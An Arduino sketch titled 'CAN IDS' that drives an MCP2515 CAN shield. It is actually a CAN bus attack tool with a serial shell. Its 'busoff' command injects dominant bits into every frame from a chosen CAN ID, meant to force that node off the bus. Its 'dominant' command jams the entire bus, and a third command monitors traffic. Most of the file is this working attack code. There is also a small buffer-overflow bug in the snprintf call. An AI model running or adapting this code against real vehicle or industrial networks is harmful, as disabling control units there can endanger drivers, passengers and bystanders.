// CAN IDS

#include <SPI.h>
#include <mcp_can.h>
#include <mcp_can_dfs.h>
#include <Shell.h>
#include <stdlib.h>

/*-------------------------------------------------------------*
 *	Define Configuration		*
 *-------------------------------------------------------------*/

/*SAMD core*/
#ifdef ARDUINO_SAMD_VARIANT_COMPLIANCE
  #define SERIAL SerialUSB
#else
  #define SERIAL Serial
#endif

//MCP2515 debug
#define DEBUG_EN 1

//#define STARTUP_METHOD busOff(0x611);

//#define MCP_CLOCK MCP_16MHZ
#define MCP_CLOCK MCP_8MHZ

#define ERROR_BIT_INSERT_TIME_US 2
#define DOMINANT_INJECT_PIN 5

/*-------------------------------------------------------------*
 *	Configuration		*
 *-------------------------------------------------------------*/

// the cs pin of the version after v1.1 is default to D9
// v0.9b and v1.0 is default D10
const int SPI_CS_PIN = 10;
const int CAN_INT_PIN = 2;

MCP_CAN CAN(SPI_CS_PIN);                  // Set CS pin

boolean ConsoleMode = true;     // シリア

/**
 * CANモニタリング用
 */
unsigned char flagRecv = 0;
unsigned char len = 0;
unsigned char buf[8];
long unsigned int rxid;
char str[20];


void MCP2515_ISR()
{
  flagRecv = 1;
}

/*-------------------------------------------------------------*
 *	Function prototypes			*
 *-------------------------------------------------------------*/

/**
 * スタートアップ
 */
void startup();

/**
 * Shellライブラリ用コマンドリーダ
 * Wrapper for Serial.read() method
 * @param data Shellライブラリ用予約
 */
int shell_reader(char * data);

/**
 * Shellライブラリ用コマンドライタ
 * Function to write data to serial port
 * Functions to write to physical media should use this prototype:
 * void my_writer_function(char data)
 * @param data Shellライブラリ用予約
 */
void shell_writer(char data);

/**
 * コンソールモードかどうか
 */
boolean isConsoleMode();

/**
 * コンソールモードを無効にする
 */
void disableConsoleMode();

/**
 * コンソールモードを有効にする
 */
void enableConsoleMode();

/**
 * シリアルによる割り込みを待つ
 * 割り込まれた場合コンソールモードが有効になります
 */
void WaitSerialInterrupt();

/**
 * Shellライブラリから呼ばれるstartCANMonitor
 */
int cmd_startCANMonitor(int argc, char** argv);

/**
 * Shellライブラリから呼ばれるDominant発生機
 */
int cmd_startDominant(int argc, char** argv);

/**
 * バスオフ
 */
int cmd_startBusOff(int argc, char** argv);

/**
 * CANモニタを開始する
 * シリアル入力を割り込まれた場合は中断します
 */
void monitorCAN();

/**
 * ドミナントを出力する
 */
void enableDominant();

/**
 * ドミナントを停止する
 */
void disableDominant();

/**
 * バスオフ攻撃するよ
 */
int busOff(unsigned int canid);

/**
 * MCP2515の初期化
 */
void init_can();

/**
 * CANIDのフィルタリング
 * @param canid フィルタしたいCANID, NULLならフィルタなし
 */
void filterById(unsigned int);

/**
 * CANメッセージの到着を最速で知るためのもの
 */
INT8U mcp2515_RxStatus(void);

/*-------------------------------------------------------------*
 *	Function			*
 *-------------------------------------------------------------*/


int shell_reader(char * data)
{
  if (SERIAL.available()) {
    *data = SERIAL.read();
    return 1;
  }
  return 0;
}

void shell_writer(char data)
{
  // Wrapper for Serial.write() method
  SERIAL.write(data);
}

boolean isConsoleMode(){
  return ConsoleMode;
}

void disableConsoleMode(){
  ConsoleMode = false;
}

void enableConsoleMode(){
  ConsoleMode = true;
}

void WaitSerialInterrupt(){
  int key;

  if (SERIAL.available() > 0){
    key = Serial.read();

    if (key != -1 && key != 0x0a) {
      SERIAL.println("Key interrupt!");
      enableConsoleMode();
    }
  }
}

int cmd_startCANMonitor(int argc, char** argv)
{
  shell_println("Start CAN Monitor."); 
  filterById(NULL); 
  monitorCAN();
  return SHELL_RET_SUCCESS;
}

int cmd_startDominant(int argc, char** argv)
{
  shell_println("Start Dominant.");
  disableConsoleMode();
  enableDominant();

  while(1){
    WaitSerialInterrupt();

    if (isConsoleMode()){
      break;
    }     
  }

  disableDominant();

}

int cmd_startBusOff(int argc, char** argv){
  if (argc < 2){
    shell_println("Usage: busoff [canid]");
    return SHELL_RET_FAILURE;
  }

  unsigned int canid;
  sscanf(argv[1], "%x", &canid);

  if (canid < 0x001 || canid > 0x7ff){
    shell_println("[Error] please type canid (001 ~ 7FF)");
    shell_println("Usage: busoff [canid]");
    return SHELL_RET_FAILURE;
  }
  char canid_str[8];
  snprintf(canid_str, 16, "%x", canid );
  shell_print("Start BusOff. target: 0x");
  shell_println(canid_str);

  busOff(canid);

  return SHELL_RET_SUCCESS;
}

int busOff(unsigned int canid){
  SERIAL.println("busOff!!");
  disableConsoleMode();

  filterById(canid);

  while (1){

    /**
     * For speed, disable interrupt
     */
    /*
    WaitSerialInterrupt();

    if (isConsoleMode()){
      break;
    }
    */

    int i = CAN.mcp2515_RxStatus();

    if (i & 0b01000000){  // RX0IF
      enableDominant();
      delayMicroseconds(ERROR_BIT_INSERT_TIME_US);
      disableDominant();
      CAN.mcp2515_modifyRegister(MCP_CANINTF, MCP_RX0IF, 0);
    }else if(i & 0b10000000){ // RX1IF
      enableDominant();
      delayMicroseconds(ERROR_BIT_INSERT_TIME_US);
      disableDominant();
      CAN.mcp2515_modifyRegister(MCP_CANINTF, MCP_RX1IF, 0);
    }
  }
  return 1;
}

void filterById(unsigned int canid){
  if (canid == NULL){
    CAN.init_Mask(0, 0, 0x0000000);
    CAN.init_Mask(1, 0, 0x0000000);
  }else{
    CAN.init_Mask(0, 0, 0x07FF0000);
    CAN.init_Mask(1, 0, 0x07FF0000);
    CAN.init_Filt(0, 0, canid * 65536);
  }
}

void monitorCAN(){
  disableConsoleMode();
  attachInterrupt(digitalPinToInterrupt(CAN_INT_PIN), MCP2515_ISR, FALLING); // start interrupt

  while (1){
    WaitSerialInterrupt();

    if (isConsoleMode()){
      detachInterrupt(digitalPinToInterrupt(CAN_INT_PIN));
      break;
    }

    if(flagRecv) 
    {                   // check if get data

      flagRecv = 0;           // clear flag

      // iterate over all pending messages
      // If either the bus is saturated or the MCU is busy,
      // both RX buffers may be in use and reading a single
      // message does not clear the IRQ conditon.
      while (CAN_MSGAVAIL == CAN.checkReceive()) 
      {
        
        // read data,  len: data length, buf: data buf
        CAN.readMsgBuf(&rxid, &len, buf);

        SERIAL.print(rxid);
        // print the data
        for(int i = 0; i<len; i++)
        {
          SERIAL.print(buf[i], HEX);SERIAL.print("\t");
        }
        SERIAL.println();
      }
    }
  }
}

void enableDominant(){
  //analogWrite(5, 178); // 3.5v
  //analogWrite(6, 76);  // 1.5v
  digitalWrite(DOMINANT_INJECT_PIN, LOW);
}

void disableDominant(){
  //analogWrite(5, 0);
  //analogWrite(6, 0);
  digitalWrite(DOMINANT_INJECT_PIN, HIGH);
}

void init_can(){
  while (CAN_OK != CAN.begin(MCP_STDEXT, CAN_500KBPS, MCP_CLOCK)){        // init can bus : baudrate = 500k
    SERIAL.println("CAN BUS Shield init fail");
    SERIAL.println(" Init CAN BUS Shield again");
    delay(100);
  }
  CAN.setMode(MCP_NORMAL);
  pinMode(CAN_INT_PIN, INPUT); 
}

void setup()
{
  SERIAL.begin(115200);
  SERIAL.setTimeout(100UL); //Timeout: 100ms

  init_can();

  pinMode(DOMINANT_INJECT_PIN, OUTPUT);
  digitalWrite(DOMINANT_INJECT_PIN, HIGH);

  shell_init(shell_reader, shell_writer, 0);
  shell_register(cmd_startCANMonitor, PSTR("monitor"));
  shell_register(cmd_startDominant, PSTR("dominant"));
  shell_register(cmd_startBusOff, PSTR("busoff"));

  startup();
}

void loop()
{
  shell_task();  
}

void startup(){
#ifdef STARTUP_METHOD
    SERIAL.println("Startup method defined!");
    ConsoleMode = false;
    STARTUP_METHOD
#endif
}

/*********************************************************************************************************
  END FILE
*********************************************************************************************************/